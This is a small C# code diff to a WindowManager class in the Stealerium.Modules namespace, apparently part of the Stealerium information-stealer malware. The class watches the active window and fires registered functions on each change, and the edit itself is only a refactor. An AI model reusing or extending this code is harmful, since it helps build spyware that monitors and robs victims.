@@ -10,7 +10,7 @@ namespace Stealerium.Modules
     internal sealed class WindowManager
     {
         public static string ActiveWindow;
-        public static Thread MainThread = new Thread(Run);
+        public static readonly Thread MainThread = new Thread(Run);
 
         // List with functions to call when active window is changed
         private static readonly List<Action> Functions = new List<Action>
@@ -56,7 +56,7 @@ namespace Stealerium.Modules
                 if (ActiveWindow == prevActiveWindow) continue;
                 prevActiveWindow = ActiveWindow;
                 foreach (var f in Functions)
-                    f.Invoke();
+                    f();
             }
         }
     }
